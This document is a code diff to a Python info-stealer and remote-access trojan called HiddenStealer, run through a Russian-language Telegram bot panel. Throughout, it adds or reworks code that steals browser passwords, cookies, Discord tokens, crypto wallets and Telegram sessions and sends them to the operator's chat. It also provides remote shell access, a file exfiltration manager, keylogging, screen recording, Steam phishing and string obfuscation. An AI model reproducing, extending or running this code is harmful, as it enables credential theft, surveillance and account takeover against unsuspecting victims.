@@ -2415,7 +2439,7 @@ class HiddenStealer:
                 output = output[:3500] + decrypt_string("MlxWRWBxAhYoAgRbE00DHjM=")
             
             if command.strip().lower() not in ['ls', 'dir', 'cd', 'pwd']:
-                return decrypt_string("UlBGm9HC1EIhBA9UFBcFDxxAHQU6Di4NKBwDVhVmAhMcT0RELG8FDGYUBVwXB1haFVEXBiMwNwYnS0VbHV0DRDJcJAU1PiwWKgIeRQ==")
+                return f"📍 <code>{self.current_working_dir}</code>\n<code>> {command}</code>\n\n{output}"
             return output
         except Exception as e:
             return decrypt_string("jK/0S3IzZyciEglNBlAJFE53ChkhI2NedRVUGAlKEghGV1EwdGBsUgcK")
@@ -2701,74 +2725,27 @@ class HiddenStealer:
         if auto_started_procs:
             time.sleep(3) 
 
-        injector = ChromeInjector()
-        if injector.is_available():
-            safe_send_message(self.bot, ADMIN_ID, "👻 Невидимо запускаю Chrome для инжекта...")
-            injector.run_injector(action="all")
-            time.sleep(5)
-
         for exe_name in set(auto_started_procs):
             try: subprocess.run(['taskkill', '/F', '/IM', exe_name], capture_output=True, creationflags=0x08000000)
             except: pass
 
-        data = self.work_modules['browser'].steal()
+        self.work_modules['browser'].steal()
+        self.report_manager.finalize_output()
 
+        # Discord tokens exfiltration
         try:
             tokens_list = self.work_modules.get('discord').steal_tokens().get('tokens', []) if 'discord' in self.work_modules else []
             if tokens_list:
                 tokens_dir = os.path.join(self.report_manager.output_dir, "Discord")
                 os.makedirs(tokens_dir, exist_ok=True)
-                with open(os.path.join(tokens_dir, decrypt_string("Gl0TDiAidwgpGAQ=")), 'w', encoding='utf-8') as f:
+                with open(os.path.join(tokens_dir, "tokens.json"), 'w', encoding='utf-8') as f:
                     json.dump(tokens_list, f)
         except: pass
 
+        # Finalize report and send ZIP
         self.report_manager.process_output_folder()
-        self.report_manager.send_output_zip()
-
-        all_data = {'passwords': [], 'cookies': []}
-        for root, dirs, files in os.walk(self.report_manager.output_dir):
-            for file in files:
-                if decrypt_string("HlMLGDk+KwYpWQBLHVc=") in file.lower():
-                    try:
-                        try:
-                            with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
-                                all_data['passwords'].extend(json.load(f))
-                        except UnicodeDecodeError:
-                            with open(os.path.join(root, file), 'r', encoding='latin-1') as f:
-                                all_data['passwords'].extend(json.load(f))
-                    except: pass
-                elif decrypt_string("DV0XACc0KkwwBAVW") in file.lower():
-                    try:
-                        try:
-                            with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
-                                all_data['cookies'].extend(json.load(f))
-                        except UnicodeDecodeError:
-                            with open(os.path.join(root, file), 'r', encoding='latin-1') as f:
-                                all_data['cookies'].extend(json.load(f))
-                    except: pass
-
-        pw_count = len(all_data['passwords'])     
-        cookie_count = len(all_data['cookies'])
-        try:
-            tokens_list = self.work_modules.get('discord').steal_tokens().get('tokens', []) if 'discord' in self.work_modules else []
-            summary_text = DataFormatter.format_summary(all_data['cookies'], all_data['passwords'], tokens_list)
-            safe_send_message(self.bot, GLOBAL_CHID, summary_text)
-        except Exception as e:
-            print("❌ Summary generation failed.")
-            safe_send_message(self.bot, GLOBAL_CHID, f"📊 Извлечено: {pw_count} паролей, {cookie_count} куки")
-
-        if pw_count > 0:
-            safe_send_message(self.bot, ADMIN_ID, f"📊 Извлечено: {pw_count} паролей, 0 куки")
-            pw_file = os.path.join(self.temp_dir, decrypt_string("D14UND4wKhEtGBhcAWYdEwBGUB8nPDxMLh4HXVoQTwdARgAf"))
-            with open(pw_file, 'w', encoding='utf-8') as f:
-                f.write(self.work_modules['browser'].format_passwords(all_data['passwords']))
-            with open(pw_file, 'rb') as f:
-                self.bot.send_document(GLOBAL_CHID, f, caption="🔑 *Browsers Passwords Captured* (Aferapokitaysky)")
-            try: os.remove(pw_file)
-            except: pass
-        else:
-            safe_send_message(self.bot, GLOBAL_CHID, "❌ Пароли не найдены.")
-        return all_data
+        self.report_manager.send_output_zip(caption="💎 ✨ ОТЧЕТ AFERAPOKITAYSKY STEALER ✨ 💎")
+        return True
     def steal_discord_data(self):
         """Инжект Discord + запуск для захвата токена"""
         if 'discord' not in self.work_modules:
@@ -2900,7 +2877,14 @@ class HiddenStealer:
 
             markup.row(types.InlineKeyboardButton("🔙 Обратно в панель", callback_data="panel_system"))
 
-            text = "📁 *Файловый менеджер*\n\n*Текущая директория:* `{}`\n*Элементов на странице:* {} из {}".format(cwd, len(page_items), len(all_items))
+            header = (
+                "📂 <b>ФАЙЛОВЫЙ МЕНЕДЖЕР</b>\n"
+                "━━━━━━━━━━━━━━━━━━\n"
+                "📍 <b>Путь:</b> <code>{}</code>\n"
+                "📃 <b>Элементов:</b> <code>{}</code> из <code>{}</code>\n"
+                "━━━━━━━━━━━━━━━━━━"
+            ).format(cwd, len(page_items), len(all_items))
+            text = header
             if message_id:
                 try:
                     self.bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="HTML")
@@ -2915,11 +2899,8 @@ class HiddenStealer:
         markup = types.InlineKeyboardMarkup()
         markup.row(
             types.InlineKeyboardButton("💬 Discord Inject", callback_data="work_discord"),
-            types.InlineKeyboardButton("🌍 Cookie", callback_data="work_browsers")
-        )
-        markup.row(
-            types.InlineKeyboardButton("🔍 Search Tokens", callback_data="discord_search"),
-            types.InlineKeyboardButton("📨 Discord DM", callback_data="discord_dm_dump")
+            types.InlineKeyboardButton("🌍 Cookie", callback_data="work_browsers"),
+            types.InlineKeyboardButton("🔍 Search Tokens", callback_data="discord_search")
         )
         markup.row(
             types.InlineKeyboardButton("📱 Telegram Session", callback_data="work_telegram"),
@@ -2927,7 +2908,6 @@ class HiddenStealer:
         )
         markup.row(
             types.InlineKeyboardButton("🎙️ Join Discord", callback_data="discord_remote_start"),
-             types.InlineKeyboardButton("🎮 Steam Phish", callback_data="steam_phish")
         )
         markup.row(
             types.InlineKeyboardButton("💰 Crypto Wallets", callback_data="work_crypto"),
@@ -2940,6 +2920,7 @@ class HiddenStealer:
         )
         lang_status = "🇺🇸 EN" if _get_vac_lang() == "en" else "🇨🇳 CN"
         markup.row(
+            types.InlineKeyboardButton("🎮 Steam Phish", callback_data="steam_phish"),
             types.InlineKeyboardButton(f"🚨 VAC ALERT [{lang_status}]", callback_data="vac_alert")
         )
         markup.row(types.InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main"))
@@ -2974,7 +2955,50 @@ class HiddenStealer:
 
         def discord_telegram_log(msg):
             cid = getattr(self, 'last_discord_chat_id', None)
-            if cid:
+            if not cid: return
+
+            if "[PROGRESS]" in msg:
+                # Remove [PROGRESS] tag for user display
+                display_text = msg.replace("[PROGRESS]", "").strip()
+                # If it's a success/error, add an emoji
+                emoji = "⏳"
+                if "100%" in msg or "ready" in msg.lower() or "готов" in msg.lower():
+                    emoji = "✅"
+                elif "error" in msg.lower() or "провалил" in msg.lower():
+                    emoji = "❌"
+
+                # If we already have a progress message, edit it
+                if cid in self.discord_progress_msg:
+                    try:
+                        self.bot.edit_message_text(
+                            chat_id=cid,
+                            message_id=self.discord_progress_msg[cid],
+                            text=f"{emoji} <b>Статус подключения Discord:</b>\n{display_text}",
+                            parse_mode="HTML"
+                        )
+                    except Exception as e:
+                        # If edit fails (e.g. same content), just pass or log internally
+                        pass
+                else:
+                    # Send a new message and store its ID
+                    sent = safe_send_message(self.bot, cid, f"{emoji} <b>Статус подключения Discord:</b>\n{display_text}", parse_mode="HTML")
+                    if sent:
+                        self.discord_progress_msg[cid] = sent.message_id
+                
+                # Check for completion (100% or "Бот готов к работе")
+                is_complete = "100%" in msg or "ready" in msg.lower() or "готов" in msg.lower()
+                if is_complete:
+                    # Clear the progress message ID so next join starts fresh
+                    if cid in self.discord_progress_msg:
+                        del self.discord_progress_msg[cid]
+                    # Trigger the control panel
+                    try:
+                        self.log(f"Discord join complete, sending panel to {cid}", "success")
+                        self.send_discord_control_panel(cid)
+                    except Exception as ex:
+                        self.log(f"Failed to send control panel: {ex}", "error")
+            else:
+                # Normal log, send as separate message or ignore
                 try: safe_send_message(self.bot, cid, "Discord: " + msg, parse_mode="HTML")
                 except: pass
 
@@ -2995,6 +3019,8 @@ class HiddenStealer:
             threading.Thread(target=run_loop, args=(self.discord_loop,), daemon=True).start()
         if not hasattr(self, 'discord_bot') or not self.discord_bot:
             self.discord_bot = DiscordInjector(callback=discord_telegram_log, headless=True)
+        else:
+            self.discord_bot.callback = discord_telegram_log
 
         if action == 'connect':
             asyncio.run_coroutine_threadsafe(self.discord_bot.connect_and_join(token, url), self.discord_loop)
@@ -3010,6 +3036,24 @@ class HiddenStealer:
                 self.discord_bot = None
             else:
                 self.log("Discord бот не запущен.", "warning")
+    def send_discord_control_panel(self, chat_id):
+        """Отправка панели управления Discord"""
+        from telebot import types
+        markup = types.InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            types.InlineKeyboardButton("🎤 Мут микро", callback_data="discord_ctrl_mic"),
+            types.InlineKeyboardButton("🔇 Мут звук", callback_data="discord_ctrl_deaf"),
+        )
+        markup.add(
+            types.InlineKeyboardButton("🖥 Демка экрана", callback_data="discord_ctrl_stream"),
+            types.InlineKeyboardButton("🔴 Выйти из войса", callback_data="discord_ctrl_disconnect"),
+        )
+        safe_send_message(self.bot, chat_id,
+            "✅ <b>Успешно подключено к голосовому каналу Discord!</b>\n\nУправление голосовым каналом:",
+            parse_mode="HTML",
+            reply_markup=markup
+        )
+
     def process_discord_join(self, message):
         """Обработка ввода данных для входа в Discord канал"""
         if not self.check_permission(message): return
@@ -3029,33 +3073,13 @@ class HiddenStealer:
         if decrypt_string("ClsLCCEjPUw9EA==") not in url and decrypt_string("DVoZBSA0NRF1") not in url:
              safe_send_message(self.bot, message.chat.id, "❌ Ссылка приглашения должна содержать 'discord.gg' или 'discord.com'.")
         token_source = "вручную" if "|" in text else "украден с жертвы"
-        safe_send_message(self.bot, message.chat.id,
-            "⏳ Пытаюсь подключиться к Discord...\n" +
-            "• Токен: `{token}...` (источник: {source})\n" +
-            "• Ссылка: `{url}`".format(token=token[:20], source=token_source, url=url),
-            parse_mode="HTML"
-        )
-        self.trigger_discord_action('connect', token, url, chat_id=message.chat.id)
+        # Initial status message is NOT sent here anymore, 
+        # because the first [PROGRESS] log from the module will create it.
+        # However, we can clear the old msg ID to be sure.
+        if message.chat.id in self.discord_progress_msg:
+            del self.discord_progress_msg[message.chat.id]
 
-        import threading as _th
-        def _send_discord_panel():
-            import time as _t
-            _t.sleep(10)
-            markup = types.InlineKeyboardMarkup(row_width=2)
-            markup.add(
-                types.InlineKeyboardButton("🎤 Мут микро", callback_data="discord_ctrl_mic"),
-                types.InlineKeyboardButton("🔇 Мут звук", callback_data="discord_ctrl_deaf"),
-            )
-            markup.add(
-                types.InlineKeyboardButton("🖥 Демка экрана", callback_data="discord_ctrl_stream"),
-                types.InlineKeyboardButton("🔴 Выйти из войса", callback_data="discord_ctrl_disconnect"),
-            )
-            safe_send_message(self.bot, message.chat.id,
-                "✅ Успешно подключено к голосовому каналу Discord!\n\n*Управление голосовым каналом:*",
-                parse_mode="HTML",
-                reply_markup=markup
-            )
-        _th.Thread(target=_send_discord_panel, daemon=True).start()
+        self.trigger_discord_action('connect', token, url, chat_id=message.chat.id)
     def _send_bridges_status(self, chat_id):
         """Send bridge status message with keyboard"""
         stats = bridge_manager.get_stats()
@@ -3100,7 +3124,7 @@ class HiddenStealer:
                 import threading
 
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.bind((decrypt_string("XwBPRX5/aUxr"), 0))
+                sock.bind(("127.0.0.1", 0))
                 sock.settimeout(600)
                 port = sock.getsockname()[1]
 
@@ -3108,7 +3132,7 @@ class HiddenStealer:
                     try:
                         while True:
                             data, _ = sock.recvfrom(2048)
-                            msg = data.decode("utf-8")
+                            msg = decrypt_string(data.decode("utf-8", errors="replace"))
                             if msg == "CLOSE":
                                 break
                             safe_send_message(self.bot, chat_id, "VAC: " + msg)
@@ -3185,7 +3209,7 @@ class HiddenStealer:
                 if os.path.exists(compiled_exe):
                     proc = subprocess.Popen(
                         [compiled_exe, "--udp", str(port), "--lang", lang],
-                        cwd=vac_dir,
+                        cwd=BASE_DIR,
                         creationflags=0x08000000,
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL,
@@ -3202,7 +3226,7 @@ class HiddenStealer:
 
                 proc = subprocess.Popen(
                     [python_exe, vac_script, "--udp", str(port), "--lang", lang],
-                    cwd=vac_dir,
+                    cwd=BASE_DIR,
                     creationflags=0x08000000,
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL,
@@ -3514,8 +3538,13 @@ class HiddenStealer:
             chat_id = call.message.chat.id
             bot = self.bot
 
-            if data == "back_to_main":
-                bot.delete_message(chat_id, call.message.message_id)
+            if data == "back_to_main" or data == "open_panel":
+                try:
+                    if data == "open_panel":
+                        bot.answer_callback_query(call.id, "🔘 Открываю панель управления...")
+                    bot.delete_message(chat_id, call.message.message_id)
+                except:
+                    pass
                 message = call.message
                 message.from_user = call.from_user
                 message.text = "/panel"
@@ -3735,65 +3764,92 @@ class HiddenStealer:
                 shell_start_handler(call.message)
 
             elif data == "file_manager":
+                self.fm_page = 0
                 self.send_file_manager(chat_id, call.message.message_id)
 
-            elif data == "fm_back":
+            elif data == "fm_up":
                 try:
-                    parent = os.path.dirname(self.fm_path)
-                    if parent != self.fm_path:
-                        self.browse_files(chat_id, start_path=parent)
+                    parent = os.path.dirname(self.current_working_dir)
+                    if parent != self.current_working_dir:
+                        self.current_working_dir = parent
+                        self.fm_page = 0
+                        self.send_file_manager(chat_id, call.message.message_id)
                     else:
                         bot.answer_callback_query(call.id, "📁 Вы в корневом каталоге")
                 except Exception as e:
-                    log_debug(f"fm_back error: {e}")
                     bot.answer_callback_query(call.id, "❌ Ошибка: " + str(e))
 
-            elif data.startswith("fm_idx:"):
+            elif data.startswith("fmd_"):
                 try:
-                    idx = int(data.split(":")[1])
-                    if hasattr(self, "fm_items") and idx < len(self.fm_items):
-                        target = os.path.join(self.fm_path, self.fm_items[idx])
+                    idx = int(data.split("_")[1])
+                    if idx < len(self.last_fm_items):
+                        target = os.path.join(self.current_working_dir, self.last_fm_items[idx])
                         if os.path.isdir(target):
-                            self.browse_files(chat_id, start_path=target)
+                            self.current_working_dir = target
+                            self.fm_page = 0
+                            self.send_file_manager(chat_id, call.message.message_id)
                         else:
-                            bot.answer_callback_query(call.id, "⏳ Отправляю файл...")
-                            def send_file_task():
-                                try:
-                                    if os.path.isfile(target):
-                                        size_mb = os.path.getsize(target) / (1024 * 1024)
-                                        if size_mb > 45:
-                                            safe_send_message(bot, chat_id, f"⚠️ Файл слишком большой ({size_mb:.2f} MB). Загружаю в облако...")
-                                            try:
-                                                from core.cloud import CloudModule
-                                                link = CloudModule.upload_file(target)
-                                                if link:
-                                                    safe_send_message(bot, chat_id, f"✅ Ссылка: {link}")
-                                                else:
-                                                    safe_send_message(bot, chat_id, "❌ Ошибка загрузки в облако")
-                                            except Exception as cloud_e:
-                                                log_debug(f"Cloud upload error: {cloud_e}")
-                                                safe_send_message(bot, chat_id, "❌ Модуль облака недоступен")
-                                        else:
-                                            with open(target, "rb") as f:
-                                                bot.send_document(chat_id, f)
-                                    else:
-                                        bot.answer_callback_query(call.id, "❌ Файл не найден")
-                                except Exception as fe:
-                                    log_debug(f"File sending error: {fe}")
-                                    safe_send_message(bot, chat_id, f"❌ Ошибка при отправке: {fe}")
-                            threading.Thread(target=send_file_task, daemon=True).start()
+                            bot.answer_callback_query(call.id, "❌ Это не папка")
                     else:
                         bot.answer_callback_query(call.id, "❌ Элемент не найден")
                 except Exception as e:
-                    log_debug(f"fm_idx handler error: {e}")
                     bot.answer_callback_query(call.id, "❌ Ошибка: " + str(e))
 
-            elif data.startswith("fm_page:"):
+            elif data.startswith("fmf_"):
                 try:
-                    page = int(data.split(":")[1])
-                    self.browse_files(chat_id, start_path=self.fm_path, page=page)
+                    idx = int(data.split("_")[1])
+                    if idx < len(self.last_fm_items):
+                        target = os.path.join(self.current_working_dir, self.last_fm_items[idx])
+                        if os.path.isfile(target):
+                            bot.answer_callback_query(call.id, "⏳ Отправляю файл...")
+                            def send_file_task():
+                                try:
+                                    stats = os.stat(target)
+                                    size_mb = stats.st_size / (1024 * 1024)
+                                    mtime = datetime.fromtimestamp(stats.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
+                                    name = os.path.basename(target)
+                                    ext = os.path.splitext(name)[1].upper() or "FILE"
+                                    
+                                    caption = (
+                                        f"📄 <b>ФАЙЛ ПОЛУЧЕН</b>\n"
+                                        f"━━━━━━━━━━━━━━━━━━\n"
+                                        f"📝 <b>Имя:</b> <code>{name}</code>\n"
+                                        f"📏 <b>Размер:</b> <code>{size_mb:.2f} MB</code>\n"
+                                        f"📂 <b>Тип:</b> <code>{ext}</code>\n"
+                                        f"🕒 <b>Изменен:</b> <code>{mtime}</code>\n"
+                                        f"━━━━━━━━━━━━━━━━━━"
+                                    )
+
+                                    if size_mb > 45:
+                                        safe_send_message(bot, chat_id, f"⚠️ Файл слишком большой ({size_mb:.2f} MB). Загружаю в облако...\n\n{caption}", parse_mode='HTML')
+                                        try:
+                                            from core.cloud import CloudModule
+                                            link = CloudModule.upload_file(target)
+                                            if link:
+                                                safe_send_message(bot, chat_id, f"✅ Ссылка: {link}")
+                                            else:
+                                                safe_send_message(bot, chat_id, "❌ Ошибка загрузки в облако")
+                                        except:
+                                            safe_send_message(bot, chat_id, "❌ Модуль облака недоступен")
+                                    else:
+                                        with open(target, "rb") as f:
+                                            bot.send_document(chat_id, f, caption=caption, parse_mode='HTML')
+                                except Exception as fe:
+                                    safe_send_message(bot, chat_id, f"❌ Ошибка при отправке: {fe}")
+                            threading.Thread(target=send_file_task, daemon=True).start()
+                        else:
+                            bot.answer_callback_query(call.id, "❌ Файл не найден")
+                    else:
+                        bot.answer_callback_query(call.id, "❌ Элемент не найден")
                 except Exception as e:
-                    log_debug(f"fm_page error: {e}")
+                    bot.answer_callback_query(call.id, "❌ Ошибка: " + str(e))
+
+            elif data.startswith("fmp_"):
+                try:
+                    page = int(data.split("_")[1])
+                    self.fm_page = page
+                    self.send_file_manager(chat_id, call.message.message_id)
+                except Exception as e:
                     bot.answer_callback_query(call.id, "❌ Ошибка: " + str(e))
 
             elif data == "discord_search":
@@ -3817,16 +3873,6 @@ class HiddenStealer:
                 bot.answer_callback_query(call.id, "⏳ Запускаю кражу Telegram сессии...")
                 threading.Thread(target=self.steal_telegram_data, daemon=True).start()
 
-            elif data == "discord_dm_dump":
-                msg_dm = safe_send_message(bot, chat_id, "💬 Введите Discord токен для дампа личных сообщений:")
-                def process_dm(m):
-                    token = m.text.strip()
-                    out_dir = os.path.join(self.temp_dir, "discord_dump")
-                    if "discord" in self.work_modules:
-                        stats = self.work_modules["discord"].dump_conversations(token, out_dir)
-                        safe_send_message(bot, chat_id, "✅ Дамп Discord DM завершен. Каналов: {channels}, сообщений: {messages}".format(channels=stats['channels'], messages=stats['messages']))
-                if msg_dm:
-                    bot.register_next_step_handler(msg_dm, process_dm)
 
             elif data == "work_crypto":
                 bot.answer_callback_query(call.id, "💰 Запускаю кражу криптокошельков...")
@@ -4161,25 +4207,25 @@ class HiddenStealer:
                 return
 
             help_text = (
-                "🆘 *СПРАВКА ПО КОМАНДАМ*\n\n"
+                "🆘 <b>СПРАВКА ПО КОМАНДАМ</b>\n\n"
                 "━━━━━━━━━━━━━━━━━━━━\n"
-                "📱 *ОСНОВНЫЕ КОМАНДЫ:*\n"
-                "/panel - 🎮 Открыть панель управления\n"
-                "/help - 🆘 Показать это сообщение\n"
-                "/ping - 🏓 Проверить статус бота\n"
-                "/clients - 👥 Список всех ПК\n"
+                "📱 <b>ОСНОВНЫЕ КОМАНДЫ:</b>\n"
+                "🔹 /panel — 🎮 Открыть панель управления\n"
+                "🔹 /help — 🆘 Показать это сообщение\n"
+                "🔹 /ping — 🏓 Проверить статус бота\n"
+                "🔹 /clients — 👥 Список всех ПК\n"
                 "\n"
-                "⌨️ *КЕЙЛОГГЕР:*\n"
-                "/keylog_toggle - Вкл/Выкл кейлоггер\n"
-                "/keylog_stats - Краткая статистика\n"
-                "/keylog_full - Получить полный лог\n"
-                "/keylog_clear - Очистить лог\n"
+                "⌨️ <b>КЕЙЛОГГЕР:</b>\n"
+                "🔹 /keylog_toggle — Вкл/Выкл кейлоггер\n"
+                "🔹 /keylog_stats — Краткая статистика\n"
+                "🔹 /keylog_full — Получить полный лог\n"
+                "🔹 /keylog_clear — Очистить лог\n"
                 "\n"
-                "🎥 *ЗАПИСЬ:*\n"
-                "/record_screen [сек] - Запись видео экрана\n"
+                "🎥 <b>ЗАПИСЬ:</b>\n"
+                "🔹 /record_screen [сек] — Запись видео экрана\n"
                 "\n"
-                "📂 *ФАЙЛЫ:*\n"
-                "/send [путь] - Скачать файл с ПК\n"
+                "📂 <b>ФАЙЛЫ:</b>\n"
+                "🔹 /send [путь] — Скачать файл с ПК\n"
                 "\n"
                 "━━━━━━━━━━━━━━━━━━━━\n"
                 f"👨‍💻 Поддержка: @{CREATOR_USERNAME}\n"
@@ -4346,20 +4392,20 @@ class HiddenStealer:
         start_idx = self.clients_page * PER_PAGE
         end_idx = start_idx + PER_PAGE
         page_clients = list(self.clients.items())[start_idx:end_idx]
-        text = "📋 *Список клиентов* (Страница {}/{})\n".format(self.clients_page + 1, total_pages)
-        text += "━" * 20 + "\n"
+        text = f"📋 <b>Список клиентов</b> (Страница {self.clients_page + 1}/{total_pages})\n"
+        text += "━━━━━━━━━━━━━━━━━━━━\n"
         for i, (hwid, client) in enumerate(page_clients, start_idx + 1):
             is_cur = hwid == self.current_client_hwid
-            cur_mark = "► " if is_cur else "   "
-            status_icon = "\U0001F7E2" if client.online else "\U0001F534"
-            label_line = f"🏷️ *Имя:* {client.label}\n" if client.label else ""
-            raw_name = f"💻 {client.pc_name}@{client.username}"
-            text += f"{cur_mark}{status_icon} *{raw_name}* ({hwid[:8]})\n"
+            cur_mark = "⚡ " if is_cur else "   "
+            status_icon = "🟢" if client.online else "🔴"
+            label_line = f"   🏷️ <b>Имя:</b> {client.label}\n" if client.label else ""
+            raw_name = f"💻 <b>{client.pc_name}@{client.username}</b>"
+            text += f"{cur_mark}{status_icon} {raw_name} (<code>{hwid[:8]}</code>)\n"
             if label_line:
                 text += label_line
-            text += f"🌍 IP: `{client.ip}` | 📁 `{client.current_working_dir}`\n"
-        text += "━" * 20 + "\n"
-        text += "💡 Настройте клиентов или выберите текущего."
+            text += f"   🌍 IP: <code>{client.ip}</code> | 📁 <code>{client.current_working_dir}</code>\n"
+        text += "━━━━━━━━━━━━━━━━━━━━\n"
+        text += "💡 Выберите клиента для управления в меню ниже."
         return text
     def clients_keyboard(self):
         markup = types.InlineKeyboardMarkup(row_width=1)
@@ -4477,10 +4523,7 @@ class HiddenStealer:
                     text = f"💻 *Результат (часть {i+1}):*\n```\n{chunk}\n```"
                     safe_send_message(self.bot, message.chat.id, text)
             else:
-                text = "✅ Команда выполнена."
-                safe_send_message(self.bot, message.chat.id, text, reply_markup=markup)
-                text = "✅ Команда выполнена."
-                safe_send_message(self.bot, message.chat.id, text, reply_markup=markup)
+                safe_send_message(self.bot, message.chat.id, "✅ Команда выполнена успешно.", reply_markup=markup)
             try:
                 self.bot.delete_message(message.chat.id, status_msg.message_id)
             except:
@@ -4651,15 +4694,23 @@ del /f /q "%~f0"
         else:
             display_title = pc_user
         mic_ok = "\u2705" if self.check_microphone_availability() else "\u274C"
+        from telebot import types
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("⌨️ Открыть панель управления", callback_data="open_panel"))
+
         text = (
-            f"🟢 ОНЛАЙН: {display_title}\n"
-            f"🌐 IP: {info.get('external_ip', 'Unknown')}\n"
-            f"🖥️ ОС: {info['os']} {info['release']}\n"
-            f"🎤 Mic: {mic_ok}\n"
-            f"⌚ {info['time']}\n\n/panel"
+            f"🚀 <b>КЛИЕНТ ОНЛАЙН</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"👤 <b>ID:</b> <code>{display_title}</code>\n"
+            f"🌐 <b>IP:</b> <code>{info.get('external_ip', 'Unknown')}</code>\n"
+            f"🖥️ <b>Система:</b> <code>{info['os']} {info['release']}</code>\n"
+            f"🎤 <b>Микрофон:</b> {mic_ok}\n"
+            f"⌚ <b>Время:</b> <code>{info['time']}</code>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            # f"⌨️ /panel – открыть панель управления" # Removed text command in favor of button
         )
         try:
-            safe_send_message(self.bot, GLOBAL_CHID, text)
+            safe_send_message(self.bot, GLOBAL_CHID, text, reply_markup=markup)
             self.start_report_sent = True
         except:
             pass
@@ -4671,7 +4722,7 @@ del /f /q "%~f0"
             p = psutil.Process(pid)
             name = p.name()
             p.kill()
-            safe_send_message(self.bot, message.chat.id, f"✅ Процесс {pid} ({name}) успешно завершен.")
+            safe_send_message(self.bot, message.chat.id, f"🎯 <b>Процесс завершен</b>\n━━━━━━━━━━━━━━━━━━\n🆔 PID: <code>{pid}</code>\n📂 Имя: <code>{name}</code>\n✅ Успешно!")
         except ValueError:
             safe_send_message(self.bot, message.chat.id, "❌ Некорректный PID. Пожалуйста, введите число.")
         except Exception as e:
@@ -4725,8 +4776,8 @@ del /f /q "%~f0"
                 if self.keylog_buffer and self.keylogger_active:
                     if len(self.keylog_buffer) >= 500:
                         self.send_advanced_keylog()
-                if self.clipboard_buffer:
-                    self.send_clipboard()
+                # if self.clipboard_buffer:
+                #     self.send_clipboard()
                 self.check_active_window()
                 self.save_client_state()
                 time.sleep(1)
